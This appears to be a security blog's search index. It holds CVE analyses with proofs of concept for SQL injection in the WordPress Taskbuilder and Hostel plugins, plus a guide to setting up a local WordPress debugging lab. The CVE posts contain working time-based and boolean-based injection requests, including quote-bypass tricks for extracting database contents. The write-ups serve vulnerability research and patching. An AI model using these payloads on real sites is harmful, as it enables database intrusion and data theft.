to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress 